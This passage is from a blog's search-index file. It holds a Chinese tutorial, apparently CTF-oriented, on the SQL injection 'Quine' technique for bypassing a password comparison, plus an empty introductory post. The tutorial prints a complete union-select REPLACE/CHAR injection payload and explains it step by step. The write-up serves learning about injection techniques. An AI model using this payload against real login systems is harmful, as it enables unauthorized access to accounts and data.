&#123;</span><br><span class="line">    die($FLAG);</span><br></pre></td></tr></table></figure><p>简单说说就是<code>sql</code>查询得到的结果与password相等，那么除了正常的逻辑的密码相同会产生相等，如果我们的输入与最后的结果，一样可以绕过验证，这就是<code>Quine</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE ( string1 , string2 , string3 )</span><br></pre></td></tr></table></figure><p>首先要知道replace函数的三个参数，第一个参数是要替换的整个字符串，第二个参数被替换的字符(串) ，第三个是要替换成的字符(串)</p><p>直接分析这个地方使用<code>Quine</code>技术的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union/**/SELECT/**/REPLACE(REPLACE(&#x27;&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#&#x27;,CHAR(34),CHAR(39)),CHAR(46),&#x27;&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#&#x27;)/**/AS/**/ch3ns1r#</span><br></pre></td></tr></table></figure><p>首先是一个大的REPLACE(),令他为A</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(&#x27;&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#&#x27;,CHAR(34),CHAR(39))</span><br></pre></td></tr></table></figure><p>其中有一个字符串，令他为B</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#</span><br></pre></td></tr></table></figure><p>则最初的payload就为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union/**/SELECT/**/REPLACE(A,CHAR(46),B)/**/AS/**/ch3ns1r#</span><br><span class="line"></span><br><span class="line">A：REPLACE(&#x27;B&#x27;,CHAR(34),CHAR(39))</span><br><span class="line">B：&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#</span><br></pre></td></tr></table></figure><p>下面这个就是<code>Quine</code>的基本形式了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(A,CHAR(46),B)  ----char(46)= .   char(34)=&quot;   char(39)=&#x27;</span><br></pre></td></tr></table></figure><p>外层replace()：将双引号char(34)双引号替换为char(39)单引号。</p><p>内层replace():  将点号char(46)替换为整个payload字符串。</p><p>举个例子：<br>假设一个<code>str</code>为（）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)</span><br></pre></td></tr></table></figure><p>最后的语句为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;,CHAR(46),&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;)</span><br></pre></td></tr></table></figure><p>首先执行char(46)得到的是点号，然后执行replace()</p><p>最后得到的结果是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;,CHAR(46),&#x27;REPLACE(&quot;.&quot;,CHAR(46),&quot;.&quot;)&#x27;)</span><br></pre></td></tr></table></figure><p>将<code>str1</code>中的点号都替换为了<code>str</code></p><p>最后再详细的解释一下最开始的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/union/**/SELECT/**/REPLACE(REPLACE(&#x27;&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#&#x27;,CHAR(34),CHAR(39)),CHAR(46),&#x27;&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#&#x27;)/**/AS/**/ch3ns1r#</span><br></pre></td></tr></table></figure><p>完整的结构为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(</span><br><span class="line">  REPLACE(</span><br><span class="line">    &#x27;原Payload字符串&#x27;,</span><br><span class="line">    CHAR(34),  -- 替换双引号为单引号</span><br><span class="line">    CHAR(39)</span><br><span class="line">  ),</span><br><span class="line">  CHAR(46),    -- 替换点号(.)为新的Payload</span><br><span class="line">  &#x27;新Payload字符串&#x27;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>首先执行内层的replace()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(</span><br><span class="line">    &#x27;原Payload字符串&#x27;,</span><br><span class="line">    CHAR(34),  -- 替换双引号为单引号</span><br><span class="line">    CHAR(39)</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">原Payload字符串：&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#</span><br></pre></td></tr></table></figure><p>得到的结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/union/**/SELECT/**/REPLACE(REPLACE(&#x27;.&#x27;,CHAR(34),CHAR(39)),CHAR(46),&#x27;.&#x27;)/**/AS/**/ch3ns1r#</span><br></pre></td></tr></table></figure><p>再执行外部的replace</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">REPLACE(</span><br><span class="line">  第一次的结果,</span><br><span class="line">  CHAR(46),    -- 替换点号(.)为新的Payload</span><br><span class="line">  &#x27;新Payload字符串&#x27;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>得到的结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/union/**/SELECT/**/REPLACE(REPLACE(&#x27;&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#&#x27;,CHAR(34),CHAR(39)),CHAR(46),&#x27;&quot;/**/union/**/SELECT/**/REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)/**/AS/**/ch3ns1r#&#x27;)/**/AS/**/ch3ns1r#&#x27;</span><br></pre></td></tr></table></figure><p><strong>精妙的地方：</strong></p><p>通过内层的replace()将单引号全部转化为了双引号从而解决了符号的问题。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 基本认识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的第一次博客</title>
      <link href="/2025/04/12/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%8D%9A%E5%AE%A2/"/>
      <url>/2025/04/12/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 自我介绍 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
